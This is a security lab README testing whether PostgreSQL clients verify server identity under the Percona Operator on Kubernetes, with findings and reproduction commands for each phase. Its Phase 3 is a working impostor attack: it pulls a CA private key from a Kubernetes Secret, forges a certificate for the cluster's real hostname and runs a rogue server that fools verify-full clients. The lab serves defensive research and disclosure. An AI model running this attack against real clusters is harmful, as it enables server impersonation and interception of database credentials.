# PostgreSQL TLS Identity Verification Lab

## Research Question

When a Postgres client connects over TLS, does it actually check it's talking to the right server? What happens under default configurations of the Percona Operator for PostgreSQL 3.1.0 on Kubernetes, what risks arise (impostor servers, CA private key exposure, SAN mismatches), how do certificate policies and lifecycles behave, and what configuration enables strict `verify-full` security?

---

## Pinned Versions

| Component | Pinned Version | Notes |
|---|---|---|
| PostgreSQL Server (Docker Phase 1) | 18.6 (`postgres:18.6-alpine`) | Official Docker image |
| Client psql / libpq | 18.6 (`psql (PostgreSQL) 18.6 (Debian 18.6-3)`) | Host client |
| OpenSSL | `OpenSSL 3.6.3 9 Jun 2026` | Host certificate generator |
| Percona Operator for PostgreSQL | 3.1.0 | Official operator release |
| Percona PostgreSQL Server (K8s Phase 2–5) | 18.6 (`percona-distribution-postgresql:18.6.1-1`) | Out-of-the-box 3.1.0 image |
| PgBouncer Image | `percona-pgbouncer:1.25.2-6` | Official connection pooler |
| cert-manager | `v1.16.2` | Official cert-manager release |
| Civo Kubernetes | `v1.35.0+k3s1` | 2 nodes (`g4s.kube.medium`, nyc1) |

---

## Summary of Key Findings

1. **Double Server-Side Plaintext Lockdown:** Both PgBouncer (`client_tls_sslmode = require`) and PostgreSQL (`hostssl` in `pg_hba.conf`) reject plaintext by default (`FATAL: SSL required`).
2. **CA Private Key Stored in Namespace (Path A & Path B):**
   - Under built-in PKI, `cluster1-cluster-ca-cert` holds `root.key`.
   - Under default `cert-manager` integration, the in-namespace `Issuer` stores `tls.key` in `cluster1-cluster-ca-cert`.
   - In both default paths, anyone with read access to Secrets in the database namespace can extract the CA signing key.
3. **The Impostor Attack Succeeds Against Defaults (Phase 3):** An attacker with namespace Secret read access can forge a certificate with the cluster's real FQDN (`cluster1-primary.pg-lab.svc.cluster.local`) signed by the stolen CA key. A client with `sslmode=verify-full` connects over TLSv1.3 without any warning.
4. **CEL Policy Immutability (Phase 4):** Once written to the cluster spec, `certManagementPolicy` cannot be changed from `userProvidedOnly` back to `auto` (`self == oldSelf` validation rule). It can only be recovered by removing `/spec/tls` via JSON patch.
5. **CA Rotation Disconnect (Phase 4):** Deleting the CA secret causes cert-manager to mint a new CA, but leaves existing leaf certs on the old CA until renewed. Once renewed, `sslmode=verify-full` clients break (`SSL error: certificate verify failed`), while `sslmode=require` clients continue connecting unawares.
6. **Custom SAN Limitation & Upstream Issue #1811 (Phase 5):** The operator hardcodes SANs to in-cluster DNS names, breaking `verify-full` on `localhost` or custom enterprise domains. Supplying user-managed certificates (`customTLSSecret`) successfully injects custom SANs and allows `verify-full` to succeed.
7. **`userProvidedOnly` Code Trap (`pki.go:219`):** Even under `certManagementPolicy: userProvidedOnly`, the operator reconciler explicitly parses `root.PrivateKey` from the Secret. The only architecture that genuinely removes the CA private key from the namespace is an external `ClusterIssuer` (e.g. Vault).

---

## How to Reproduce Each Phase

### Phase 1: Local Docker Warm-Up
```bash
# 1. Generate local certificates
./scripts/gen-certs.sh

# 2. Run real database container
docker run -d --name postgres-real -p 5432:5432 \
  -e POSTGRES_PASSWORD=postgres -v $(pwd)/docker/certs:/certs:ro \
  postgres:18.6-alpine \
  sh -c "cp /certs/server-real.crt /tmp/server.crt && cp /certs/server-real.key /tmp/server.key && chown postgres:postgres /tmp/server.* && chmod 600 /tmp/server.key && exec docker-entrypoint.sh postgres -c ssl=on -c ssl_cert_file=/tmp/server.crt -c ssl_key_file=/tmp/server.key"

# 3. Run automated connection matrix
./scripts/test-matrix.sh real localhost 5432 docker/certs/ca-a.crt
```

---

### Phase 2: Percona Defaults on Kubernetes (Civo)
```bash
# 1. Create a Civo cluster
civo k8s create pg-lab --size g4s.kube.medium --nodes 2 --region nyc1 --save --wait

# 2. Deploy Path A (Built-in PKI)
./scripts/up.sh p2-builtin-certs pg-lab

# 3. Port-forward PgBouncer and run connection matrix
kubectl port-forward svc/cluster1-pgbouncer 5433:5432 -n pg-lab &
kubectl get secret cluster1-cluster-ca-cert -n pg-lab -o jsonpath='{.data.root\.crt}' | base64 -d > civo-ca.crt
export PGPASSWORD=$(kubectl get secret cluster1-pguser-cluster1 -n pg-lab -o jsonpath='{.data.password}' | base64 -d)
PGUSER=cluster1 PGDATABASE=cluster1 ./scripts/test-matrix.sh civo-path-a-pgbouncer localhost 5433 civo-ca.crt 127.0.0.1 evidence/phase2
```

---

### Phase 3: The Impostor Attack
```bash
# 1. Extract CA private key from Kubernetes namespace Secret
kubectl get secret cluster1-cluster-ca-cert -n pg-lab -o jsonpath='{.data.root\.key}' | base64 -d > stolen.key
kubectl get secret cluster1-cluster-ca-cert -n pg-lab -o jsonpath='{.data.root\.crt}' | base64 -d > stolen.crt

# 2. Mint forged certificate for the legitimate cluster primary FQDN
openssl req -newkey rsa:2048 -nodes -keyout impostor.key -out impostor.csr -subj "/CN=cluster1-primary.pg-lab.svc.cluster.local"
openssl x509 -req -in impostor.csr -CA stolen.crt -CAkey stolen.key -CAcreateserial -days 1 -out impostor.crt \
  -extfile <(printf '%s\n' "basicConstraints=CA:FALSE" "subjectAltName=DNS:cluster1-primary.pg-lab.svc.cluster.local,DNS:localhost,IP:127.0.0.1")

# 3. Start rogue database container serving forged certificate
docker run -d --rm --name pg-impostor -p 5435:5432 -e POSTGRES_PASSWORD=cluster1 \
  -v $(pwd)/impostor.crt:/tmp/server.crt:ro -v $(pwd)/impostor.key:/tmp/server.key:ro \
  postgres:18-alpine sh -c "cp /tmp/server.* /var/lib/postgresql/ && chown postgres:postgres /var/lib/postgresql/server.* && chmod 600 /var/lib/postgresql/server.key && exec docker-entrypoint.sh postgres -c ssl=on -c ssl_cert_file=/var/lib/postgresql/server.crt -c ssl_key_file=/var/lib/postgresql/server.key"

# 4. Connect with strict verify-full (proves client is fooled)
PGPASSWORD=cluster1 psql "host=localhost port=5435 user=postgres dbname=postgres sslmode=verify-full sslrootcert=stolen.crt" -c "\conninfo"
```

---

### Phase 5: Custom SANs & The Enterprise Fix
```bash
# 1. Deploy p5-customsan (generates offline enterprise CA, signs custom SAN certs, and applies custom secrets)
./scripts/up.sh p5-customsan pg-lab

# 2. Port-forward PgBouncer in a dedicated terminal
while true; do kubectl port-forward svc/cluster1-pgbouncer 5433:5432 -n pg-lab; sleep 0.1; done

# 3. Test verify-full on localhost (previously failed under defaults)
export PGPASSWORD=$(kubectl get secret cluster1-pguser-cluster1 -n pg-lab -o jsonpath='{.data.password}' | base64 -d)
psql "host=localhost port=5433 user=cluster1 dbname=cluster1 sslmode=verify-full sslrootcert=custom-ca.crt" -c "\conninfo"

# 4. Test verify-full on custom corporate domain
psql "host=postgres.custom.local hostaddr=127.0.0.1 port=5433 user=cluster1 dbname=cluster1 sslmode=verify-full sslrootcert=custom-ca.crt" -c "\conninfo"

# 5. Run full 12-row connection matrix
PGUSER=cluster1 PGDATABASE=cluster1 ./scripts/test-matrix.sh phase5-pgbouncer localhost 5433 custom-ca.crt 127.0.0.1 evidence/phase5

# 6. Teardown cluster and purge orphaned storage
./scripts/down.sh pg-lab pg-lab nyc1
```

---

## Evidence Directory Structure

- `evidence/phase1/`: Raw connection outputs for Docker tests across all 6 SSL modes.
- `evidence/phase2/`: Path A (built-in PKI) and Path B (cert-manager) connection matrices, SAN dumps, and Issuer specs.
- `evidence/phase3/`: Phase 3 impostor attack proof fooling `verify-full` using stolen CA key.
- `evidence/phase4/`: Certificate policy immutability errors, leaf cert auto-healing logs, and CA rotation impact logs.
- `evidence/phase5/`: Custom SAN dumps, `localhost` and `postgres.custom.local` `verify-full` proof, full 12-row matrix, Patroni replication state, and proof of impostor attack rejection.
